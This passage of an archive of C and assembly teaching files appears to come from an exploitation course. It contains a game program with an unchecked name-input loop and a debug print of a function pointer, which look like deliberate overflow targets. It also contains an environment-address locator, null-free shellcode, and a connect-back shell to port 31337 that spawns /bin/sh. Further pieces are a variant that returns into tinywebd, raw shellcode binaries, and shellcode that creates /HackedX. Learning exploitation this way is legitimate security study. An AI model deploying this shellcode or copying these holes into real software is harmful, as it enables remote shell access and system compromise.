   write(fd, &(player.name), 100);    // Update name.
   close(fd);
}

// This function will display the current high score and
// the name of the person who set that high score.
void show_highscore() {
   unsigned int top_score = 0;
   char top_name[100];
   struct user entry;
   int fd;

   printf("\n====================| HIGH SCORE |====================\n");
   fd = open(DATAFILE, O_RDONLY);
   if(fd == -1)
      fatal("in show_highscore() while opening file");
   while(read(fd, &entry, sizeof(struct user)) > 0) { // Loop until end of file.
      if(entry.highscore > top_score) {   // If there is a higher score,
            top_score = entry.highscore;  // set top_score to that score
            strcpy(top_name, entry.name); // and top_name to that username.
         }
   }
   close(fd);
   if(top_score > player.highscore)
      printf("%s has the high score of %u\n", top_name, top_score);
   else
      printf("You currently have the high score of %u credits!\n", player.highscore);
   printf("======================================================\n\n");
}

// This function simply awards the jackpot for the Pick a Number game
void jackpot() {
   printf("*+*+*+*+*+* JACKPOT *+*+*+*+*+*\n");
   printf("You have won the jackpot of 100 credits!\n");
   player.credits += 100;
}

// This function is used to input the player name, since 
// scanf("%s", &whatever) will stop input at the first space.
void input_name() {
   char *name_ptr, input_char='\n';
   while(input_char == '\n')    // Flush any leftover 
      scanf("%c", &input_char); // newline chars.
   
   name_ptr = (char *) &(player.name); // name_ptr = player name's address
   while(input_char != '\n') {  // Loop until newline.
      *name_ptr = input_char;   // Put the input char into name field.
      scanf("%c", &input_char); // Get the next char.
      name_ptr++;               // Increment the name pointer.
   }
   *name_ptr = 0;  // Terminate the string.
}

// This function prints the 3 cards for the Find the Ace game.
// It expects a message to display, a pointer to the cards array,
// and the card the user has picked as input. If the user_pick is
// -1, then the selection numbers are displayed.
void print_cards(char *message, char *cards, int user_pick) {
   int i;

   printf("\n\t*** %s ***\n", message);
   printf("      \t._.\t._.\t._.\n");
   printf("Cards:\t|%c|\t|%c|\t|%c|\n\t", cards[0], cards[1], cards[2]);
   if(user_pick == -1)
      printf(" 1 \t 2 \t 3\n");
   else {
      for(i=0; i < user_pick; i++)
         printf("\t");
      printf(" ^-- your pick\n");
   }
}

// This function inputs wagers for both the No Match Dealer and
// Find the Ace games. It expects the available credits and the
// previous wager as arguments. The previous_wager is only important
// for the second wager in the Find the Ace game. The function
// returns -1 if the wager is too big or too little, and it returns
// the wager amount otherwise.
int take_wager(int available_credits, int previous_wager) {
   int wager, total_wager;

   printf("How many of your %d credits would you like to wager?  ", available_credits);
   scanf("%d", &wager);
   if(wager < 1) {   // Make sure the wager is greater than 0.
      printf("Nice try, but you must wager a positive number!\n");
      return -1;
   }
   total_wager = previous_wager + wager;
   if(total_wager > available_credits) {  // Confirm available credits
      printf("Your total wager of %d is more than you have!\n", total_wager);
      printf("You only have %d available credits, try again.\n", available_credits);
      return -1;
   }
   return wager;
}

// This function contains a loop to allow the current game to be
// played again. It also writes the new credit totals to file
// after each game is played.
void play_the_game() { 
   int play_again = 1;
   int (*game) ();
   char selection;

   while(play_again) {
      printf("\n[DEBUG] current_game pointer @ 0x%08x\n", player.current_game);
      if(player.current_game() != -1) { // If the game plays without error and
         if(player.credits > player.highscore)  // a new high score is set,
            player.highscore = player.credits;  // update the highscore.
         printf("\nYou now have %u credits\n", player.credits);
         update_player_data(); // Write the new credit total to file.
         printf("Would you like to play again? (y/n)  ");
         selection = '\n';
         while(selection == '\n')   // Flush any extra newlines.
            scanf("%c", &selection);
         if(selection == 'n')
            play_again = 0;
      }
      else  // This means the game returned an error,
         play_again = 0; // so return to main menu.
   }
}

// This function is the Pick a Number game.
// It returns -1 if the player doesn't have enough credits.
int pick_a_number() { 
   int pick, winning_number;

   printf("\n####### Pick a Number ######\n");
   printf("This game costs 10 credits to play. Simply pick a number\n");
   printf("between 1 and 20, and if you pick the winning number, you\n");
   printf("will win the jackpot of 100 credits!\n\n");
   winning_number = (rand() % 20) + 1; // Pick a number between 1 and 20.
   if(player.credits < 10) {
      printf("You only have %d credits. That's not enough to play!\n\n", player.credits);
      return -1;  // Not enough credits to play 
   }
   player.credits -= 10; // Deduct 10 credits
   printf("10 credits have been deducted from your account.\n");
   printf("Pick a number between 1 and 20: ");
   scanf("%d", &pick);

   printf("The winning number is %d\n", winning_number);
   if(pick == winning_number)
      jackpot();
   else
      printf("Sorry, you didn't win.\n");
   return 0;
}

// This is the No Match Dealer game.
// It returns -1 if the player has 0 credits.
int dealer_no_match() { 
   int i, j, numbers[16], wager = -1, match = -1;

   printf("\n::::::: No Match Dealer :::::::\n");
   printf("In this game, you can wager up to all of your credits.\n");
   printf("The dealer will deal out 16 random numbers between 0 and 99.\n");
   printf("If there are no matches among them, you double your money!\n\n");
  
   if(player.credits == 0) {
      printf("You don't have any credits to wager!\n\n");
      return -1;
   }
   while(wager == -1)
      wager = take_wager(player.credits, 0);

   printf("\t\t::: Dealing out 16 random numbers :::\n");
   for(i=0; i < 16; i++) {
      numbers[i] = rand() % 100; // pick a number 0 to 99
      printf("%2d\t", numbers[i]);
      if(i%8 == 7)  // Print a line break every 8 numbers.
         printf("\n");
   }
   for(i=0; i < 15; i++) {  // Loop looking for matches
      j = i + 1;
      while(j < 16) {
         if(numbers[i] == numbers[j])
            match = numbers[i];
         j++;
      }
   }
   if(match != -1) {
      printf("The dealer matched the number %d!\n", match);
      printf("You lose %d credits.\n", wager);
      player.credits -= wager;
   } else {
      printf("There were no matches! You win %d credits!\n", wager);
      player.credits += wager;
   }
   return 0;
}

// This is the Find the Ace game.
// It returns -1 if the player has 0 credits.
int find_the_ace() {
   int i, ace, total_wager;
   int invalid_choice, pick = -1, wager_one = -1, wager_two = -1;
   char choice_two, cards[3] = {'X', 'X', 'X'};

   ace = rand()%3; // Place the ace randomly.

   printf("******* Find the Ace *******\n");
   printf("In this game, you can wager up to all of your credits.\n");
   printf("Three cards will be dealt out, two queens and one ace.\n");
   printf("If you find the ace, you will win your wager.\n");
   printf("After choosing a card, one of the queens will be revealed.\n");
   printf("At this point, you may either select a different card or\n");
   printf("increase your wager.\n\n");

   if(player.credits == 0) {
      printf("You don't have any credits to wager!\n\n");
      return -1;
   }
   
   while(wager_one == -1) // Loop until valid wager is made.
      wager_one = take_wager(player.credits, 0);

   print_cards("Dealing cards", cards, -1);
   pick = -1;
   while((pick < 1) || (pick > 3)) { // Loop until valid pick is made.
      printf("Select a card: 1, 2, or 3  ");
      scanf("%d", &pick);
   }
   pick--; // Adjust the pick since card numbering starts at 0.
   i=0;
   while(i == ace || i == pick) // Keep looping until 
      i++;                      // we find a valid queen to reveal.
   cards[i] = 'Q';
   print_cards("Revealing a queen", cards, pick);
   invalid_choice = 1;
   while(invalid_choice) {   // Loop until valid choice is made.
      printf("Would you like to:\n[c]hange your pick\tor\t[i]ncrease your wager?\n");
      printf("Select c or i:  ");
      choice_two = '\n';
      while(choice_two == '\n') // Flush extra newlines.
         scanf("%c", &choice_two);
      if(choice_two == 'i') {   // Increase wager.
            invalid_choice=0;   // This is a valid choice.
            while(wager_two == -1)  // Loop until valid second wager is made.
               wager_two = take_wager(player.credits, wager_one);
         }
      if(choice_two == 'c') {    // Change pick.
         i = invalid_choice = 0; // Valid choice
         while(i == pick || cards[i] == 'Q') // Loop until the other card
            i++;// is found,
         pick = i;// and then swap pick.
         printf("Your card pick has been changed to card %d\n", pick+1);
      }
   }

   for(i=0; i < 3; i++) {  // Reveal all of the cards.
      if(ace == i)
         cards[i] = 'A';
      else
         cards[i] = 'Q';
   }
   print_cards("End result", cards, pick);
   
   if(pick == ace) {  // handle win
      printf("You have won %d credits from your first wager\n", wager_one);
      player.credits += wager_one;
      if(wager_two != -1) {
         printf("and an additional %d credits from your second wager!\n", wager_two);
         player.credits += wager_two;
      }
   } else { // handle loss
      printf("You have lost %d credits from your first wager\n", wager_one);
      player.credits -= wager_one;
      if(wager_two != -1) {
         printf("and an additional %d credits from your second wager!\n", wager_two);
         player.credits -= wager_two;
      }
   }
   return 0;
}
                                                     getenvaddr.c                                                                                        0000644 0001747 0001747 00000000610 12564742435 012660  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
                                                                                                                        getenv_example.c                                                                                    0000644 0001747 0001747 00000000201 12564742435 013534  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
                                                                                                                                                                                                                                                                                                                                                                                               hacking.h                                                                                           0000644 0001747 0001747 00000002306 12564742435 012152  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

// A function to display an error message and then exit
void fatal(char *message) {
   char error_message[100];

   strcpy(error_message, "[!!] Fatal Error ");
   strncat(error_message, message, 83);
   perror(error_message);
   exit(-1);
}

// An error checked malloc() wrapper function
void *ec_malloc(unsigned int size) {
   void *ptr;
   ptr = malloc(size);
   if(ptr == NULL)
      fatal("in ec_malloc() on memory allocation");
   return ptr;
}

// dumps raw memory in hex byte and printable split format
void dump(const unsigned char *data_buffer, const unsigned int length) {
	unsigned char byte;
	unsigned int i, j;
	for(i=0; i < length; i++) {
		byte = data_buffer[i];
		printf("%02x ", data_buffer[i]);  // display byte in hex
		if(((i%16)==15) || (i==length-1)) {
			for(j=0; j < 15-(i%16); j++)
				printf("   ");
			printf("| ");
			for(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line
				byte = data_buffer[j];
				if((byte > 31) && (byte < 127)) // outside printable char range
					printf("%c", byte);
				else
					printf(".");
			}
			printf("\n"); // end of the dump line (each line 16 bytes)
		} // end if
	} // end for
}

                                                                                                                                                                                                                                                                                                                          hacking-network.h                                                                                   0000644 0001747 0001747 00000006573 12564742435 013653  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 /* This function accepts a socket FD and a ptr to the null terminated
 * string to send.  The function will make sure all the bytes of the
 * string are sent.  Returns 1 on success and 0 on failure.
 */
int send_string(int sockfd, unsigned char *buffer) {
   int sent_bytes, bytes_to_send;
   bytes_to_send = strlen(buffer);
   while(bytes_to_send > 0) {
      sent_bytes = send(sockfd, buffer, bytes_to_send, 0);
      if(sent_bytes == -1)
         return 0; // return 0 on send error
      bytes_to_send -= sent_bytes;
      buffer += sent_bytes;
   }
   return 1; // return 1 on success
}

/* This function accepts a socket FD and a ptr to a destination
 * buffer.  It will receive from the socket until the EOL byte
 * sequence in seen.  The EOL bytes are read from the socket, but
 * the destination buffer is terminated before these bytes.
 * Returns the size of the read line (without EOL bytes).
 */
int recv_line(int sockfd, unsigned char *dest_buffer) {
#define EOL "\r\n" // End-Of-Line byte sequence
#define EOL_SIZE 2
   unsigned char *ptr;
   int eol_matched = 0;

   ptr = dest_buffer;
   while(recv(sockfd, ptr, 1, 0) == 1) { // read a single byte
      if(*ptr == EOL[eol_matched]) { // does this byte match terminator
         eol_matched++;
         if(eol_matched == EOL_SIZE) { // if all bytes match terminator,
            *(ptr+1-EOL_SIZE) = '\0'; // terminate the string
            return strlen(dest_buffer); // return bytes recevied
         }
      } else {
         eol_matched = 0;
      }   
      ptr++; // increment the pointer to the next byter;
   }
   return 0; // didn't find the end of line characters
}


/* Structure for Ethernet headers */
#define ETHER_ADDR_LEN 6
#define ETHER_HDR_LEN 14

struct ether_hdr {
   unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address
   unsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address
   unsigned short ether_type; // Type of Ethernet packet
};

/* Structure for Internet Protocol (IP) headers */
struct ip_hdr {
   unsigned char ip_version_and_header_length; // version and header length combined
   unsigned char ip_tos;          // type of service
   unsigned short ip_len;         // total length
   unsigned short ip_id;          // identification number
   unsigned short ip_frag_offset; // fragment offset and flags
   unsigned char ip_ttl;          // time to live
   unsigned char ip_type;         // protocol type
   unsigned short ip_checksum;    // checksum
   unsigned int ip_src_addr;      // source IP address
   unsigned int ip_dest_addr;     // destination IP address
};

/* Structure for Transmission Control Protocol (TCP) headers */
struct tcp_hdr {
   unsigned short tcp_src_port;   // source TCP port
   unsigned short tcp_dest_port;  // destination TCP port
   unsigned int tcp_seq;          // TCP sequence number
   unsigned int tcp_ack;          // TCP acknowledgement number
   unsigned char reserved:4;      // 4-bits from the 6-bits of reserved space
   unsigned char tcp_offset:4;    // TCP data offset for little endian host
   unsigned char tcp_flags;       // TCP flags (and 2-bits from reserved space)
#define TCP_FIN   0x01
#define TCP_SYN   0x02
#define TCP_RST   0x04
#define TCP_PUSH  0x08
#define TCP_ACK   0x10
#define TCP_URG   0x20
   unsigned short tcp_window;     // TCP window size
   unsigned short tcp_checksum;   // TCP checksum
   unsigned short tcp_urgent;     // TCP urgent pointer
};
                                                                                                                                     heap_example.c                                                                                      0000644 0001747 0001747 00000003570 12564742435 013175  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char *char_ptr;  // a char pointer
   int *int_ptr;    // an integer pointer
   int mem_size;

   if (argc < 2)     // if there aren't commandline arguments,
      mem_size = 50; // use 50 as the default value..
   else
      mem_size = atoi(argv[1]);

   printf("\t[+] allocating %d bytes of memory on the heap for char_ptr\n", mem_size);
   char_ptr = (char *) malloc(mem_size); // allocating heap memory

   if(char_ptr == NULL) {  // error checking, in case malloc() fails
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }

   strcpy(char_ptr, "This is memory is located on the heap.");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[+] allocating 12 bytes of memory on the heap for int_ptr\n");
   int_ptr = (int *) malloc(12); // allocated heap memory again

   if(int_ptr == NULL) {  // error checking, in case malloc() fails
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }

   *int_ptr = 31337; // put the value of 31337 where int_ptr is pointing
   printf("int_ptr (%p) --> %d\n", int_ptr, *int_ptr);


   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); // freeing heap memory

   printf("\t[+] allocating another 15 bytes for char_ptr\n");
   char_ptr = (char *) malloc(15); // allocating more heap memory

   if(char_ptr == NULL) {  // error checking, in case malloc() fails
      fprintf(stderr, "Error: could not allocate heap memory.\n");
      exit(-1);
   }

   strcpy(char_ptr, "new memory");
   printf("char_ptr (%p) --> '%s'\n", char_ptr, char_ptr);

   printf("\t[-] freeing int_ptr's heap memory...\n");
   free(int_ptr); // freeing heap memory
   printf("\t[-] freeing char_ptr's heap memory...\n");
   free(char_ptr); // freeing the other block of heap memory
}
                                                                                                                                        helloworld1                                                                                         0000644 0001747 0001747 00000000061 12564742435 012550  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 �   Hello World!
Y�   �   �   ̀�   �    ̀                                                                                                                                                                                                                                                                                                                                                                                                                                                                               helloworld1.s                                                                                       0000644 0001747 0001747 00000001210 12564742435 013006  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32             ; tell nasm this is 32-bit code

  call mark_below   ; call below the string to instructions
  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes

mark_below:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx           ; pop the return address (string ptr) into ecx
  mov eax, 4        ; write syscall #
  mov ebx, 1        ; STDOUT file descriptor
  mov edx, 15       ; length of the string
  int 0x80          ; do syscall: write(1, string, 14)

; void _exit(int status);
  mov eax, 1        ; exit syscall #
  mov ebx, 0        ; status = 0   
  int 0x80          ; do syscall:  exit(0)
                                                                                                                                                                                                                                                                                                                                                                                        helloworld2.s                                                                                       0000644 0001747 0001747 00000001266 12564742435 013022  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32             ; tell nasm this is 32-bit code

jmp short one       ; jump down to a call at the end

two:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx           ; pop the return address (string ptr) into ecx
  mov eax, 4        ; write syscall #
  mov ebx, 1        ; STDOUT file descriptor
  mov edx, 15       ; length of the string
  int 0x80          ; do syscall: write(1, string, 14)

; void _exit(int status);
  mov eax, 1        ; exit syscall #
  mov ebx, 0        ; status = 0   
  int 0x80          ; do syscall:  exit(0)

one:
  call two   ; call back upwards to avoid null bytes
  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes

                                                                                                                                                                                                                                                                                                                                          helloworld3                                                                                         0000644 0001747 0001747 00000000050 12564742435 012550  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 �Y1��1�C1Ҳ̀�K̀�����Hello World!
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        helloworld3.s                                                                                       0000644 0001747 0001747 00000001621 12564742435 013016  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32             ; tell nasm this is 32-bit code

jmp short one       ; jump down to a call at the end

two:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx           ; pop the return address (string ptr) into ecx
  xor eax, eax      ; zero out full 32-bits of eax register
  mov al, 4         ; write syscall #4 to the low byte of eax
  xor ebx, ebx      ; zero out ebx
  inc ebx           ; increment ebx to 1, STDOUT file descriptor
  xor edx, edx
  mov dl, 15        ; length of the string
  int 0x80          ; do syscall: write(1, string, 14)

; void _exit(int status);
  mov al, 1        ; exit syscall #1, the top 3 bytes are still zeroed
  dec ebx          ; decrement ebx back down to 0 for status = 0   
  int 0x80         ; do syscall:  exit(0)

one:
  call two   ; call back upwards to avoid null bytes
  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes

                                                                                                               helloworld.asm                                                                                      0000644 0001747 0001747 00000001320 12564742435 013245  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 section .data       ; data segment
msg     db      "Hello, world!", 0x0a   ; the string and newline char

section .text       ; text segment
global _start       ; Default entry point for ELF linking

_start:
  ; SYSCALL: write(1, msg, 14) 
  mov eax, 4        ; put 4 into eax, since write is syscall #4
  mov ebx, 1        ; put 1 into ebx, since stdout is 1
  mov ecx, msg      ; put the address of the string into ecx
  mov edx, 14       ; put 14 into edx, since our string is 14 bytes
  int 0x80          ; Call the kernel to make the system call happen

  ; SYSCALL: exit(0)
  mov eax, 1        ; put 1 into eax, since exit is syscall #1
  mov ebx, 0        ; exit with success
  int 0x80          ; do the syscall
                                                                                                                                                                                                                                                                                                                helloworld.c                                                                                        0000644 0001747 0001747 00000000112 12564742435 012705  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
int main() {
  printf("Hello World.\n");
  return 0;
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                      helloworld.o                                                                                        0000644 0001747 0001747 00000001300 12564742435 012721  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 ELF                      @       4     (                                                                    �                                 �  "                                �                                  �  :                                    p               (              �                    0   	           �                 Hello, world!
  �   �   �    �   ̀�   �    ̀               The Netwide Assembler 0.98.38   .data .text .comment .shstrtab .symtab .strtab .rel.text                                   ��             ��                                                        helloworld.asm msg _start                                                                                                                                                                                                                                                                                                                                                   host_lookup.c                                                                                       0000644 0001747 0001747 00000001077 12564742435 013113  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <netdb.h>

#include "hacking.h"

int main(int argc, char *argv[]) {
	struct hostent *host_info;
	struct in_addr *address;
	
	if(argc < 2) {
		printf("Usage: %s <hostname>\n", argv[0]);
		exit(1);
	}

	host_info = gethostbyname(argv[1]);
	if(host_info == NULL) {
		printf("Couldn't lookup %s\n", argv[1]);
	} else {
		address = (struct in_addr *) (host_info->h_addr);
		printf("%s has address %s\n", argv[1], inet_ntoa(*address));
	}
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                 input.c                                                                                             0000644 0001747 0001747 00000000407 12564742435 011700  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <string.h>

int main() {
   char message[10];
   int count, i;

   strcpy(message, "Hello, world!");

   printf("Repeat how many times? ");
   scanf("%d", &count);

   for(i=0; i < count; i++)
      printf("%3d - %s\n", i, message);
}
                                                                                                                                                                                                                                                         loopback_shell                                                                                      0000644 0001747 0001747 00000000123 12564742435 013274  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jfX�1�CRjj��̀�jfXCh��f�T$fhzifS��jQV��C̀���I�?̀Iy��Rh//shh/bin��R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                             loopback_shell_restore                                                                              0000644 0001747 0001747 00000000146 12564742435 015044  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jX̀��t
�l$hh���jfX�1�CRjj��̀�jfXCh��f�T$fhzifS��jQV��C̀���I�?̀Iy��Rh//shh/bin��R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                          loopback_shell_restore.s                                                                            0000644 0001747 0001747 00000006125 12564742435 015310  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

   push BYTE 0x02    ; fork is syscall #2
   pop eax
   int 0x80          ; after the fork, in child process eax == 0
   test eax, eax
   jz child_process  ; in child process spawn a shell

      ; in the parent process, restore tinywebd
   lea ebp, [esp+0x68]  ; restore EBP
   push 0x08048fb7      ; return address
   ret                  ; return

child_process:
; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  xchg esi, eax     ; save socket FD in esi for later

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1
  mov WORD [esp+1], dx  ; overwrite the BBBB with 0000 in the previous push 
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80          ; eax = 0 on successful connection

;  jz success        ; if connection successful, jump down to spawn shell
;  xor eax, eax      ; otherwise, exit cleanly
;  inc eax           ; eax = 1 exit (syscall #1)
;  xor ebx, ebx      ; status = 0  (nothing to see here)
;  int 0x80

;success:
; dup2(connected socket, {all three standard I/O file descriptors})
  xchg esi, ebx     ; put socket FD from esi into ebx (esi = 3)
  xchg ecx, esi     ; ecx = 3
  dec ecx           ; ecx starts at 2
;  xchg eax, esi     ; eax = 0x00000003  
;  push BYTE 0x2
;  pop ecx           ; ecx starts at 2
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0 
  jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                                                                                                                                                                                                                                                                                                                                                                           loopback_shell.s                                                                                    0000644 0001747 0001747 00000005347 12564742435 013552  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  xchg esi, eax     ; save socket FD in esi for later

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1
  mov WORD [esp+1], dx  ; overwrite the BBBB with 0000 in the previous push 
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80          ; eax = 0 on successful connection

;  jz success        ; if connection successful, jump down to spawn shell
;  xor eax, eax      ; otherwise, exit cleanly
;  inc eax           ; eax = 1 exit (syscall #1)
;  xor ebx, ebx      ; status = 0  (nothing to see here)
;  int 0x80

;success:
; dup2(connected socket, {all three standard I/O file descriptors})
  xchg esi, ebx     ; put socket FD from esi into ebx (esi = 3)
  xchg ecx, esi     ; ecx = 3
  dec ecx           ; ecx starts at 2
;  xchg eax, esi     ; eax = 0x00000003  
;  push BYTE 0x2
;  pop ecx           ; ecx starts at 2
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0 
  jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
                                                                                                                                                                                                                                                                                         mark                                                                                                0000644 0001747 0001747 00000000054 12564742435 011250  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 �[1ɈKjXf�A1�f��̀��jX̀������/HackedX                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    mark_break                                                                                          0000644 0001747 0001747 00000000054 12564742435 012414  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 �[1ɈKjXf�A1�f��̀��jX̀������/HackedX                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    mark_break.s                                                                                        0000644 0001747 0001747 00000001143 12564742435 012655  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32
; Mark the filesystem to prove you ran
   jmp short one
   two:
   pop ebx              ; filename
   xor ecx, ecx
   mov BYTE [ebx+7], cl ; null terminate filename
   push BYTE 0x5        ; open()
   pop eax
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT
   xor edx, edx
   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR
   int 0x80             ; open file to create it
      ; eax = returned file descriptor
   mov ebx, eax         ; file descriptor to second arg
   push BYTE 0x6        ; close ()
   pop eax
   int 0x80  ; close file

   int3   ; interrupt
one:
   call two
db "/HackedX" 
;   01234567
                                                                                                                                                                                                                                                                                                                                                                                                                             mark_restore                                                                                        0000644 0001747 0001747 00000000065 12564742435 013015  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 �&[1ɈKjXf�A1�f��̀��jX̀�l$hh��������/HackedX                                                                                                                                                                                                                                                                                                                                                                                                                                                                           mark_restore.s                                                                                      0000644 0001747 0001747 00000001275 12564742435 013262  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32
; Mark the filesystem to prove you ran
   jmp short one
   two:
   pop ebx              ; filename
   xor ecx, ecx
   mov BYTE [ebx+7], cl ; null terminate filename
   push BYTE 0x5        ; open()
   pop eax
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT
   xor edx, edx
   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR
   int 0x80             ; open file to create it
      ; eax = returned file descriptor
   mov ebx, eax         ; file descriptor to second arg
   push BYTE 0x6        ; close ()
   pop eax
   int 0x80  ; close file

   lea ebp, [esp+0x68]  ; restore EBP
   push 0x08048fb7      ; return address
   ret                  ; return
one:
   call two
db "/HackedX" 
;   01234567
                                                                                                                                                                                                                                                                                                                                   mark.s                                                                                              0000644 0001747 0001747 00000001143 12564742435 011511  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32
; Mark the filesystem to prove you ran
   jmp short one
   two:
   pop ebx              ; filename
   xor ecx, ecx
   mov BYTE [ebx+7], cl ; null terminate filename
   push BYTE 0x5        ; open()
   pop eax
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT
   xor edx, edx
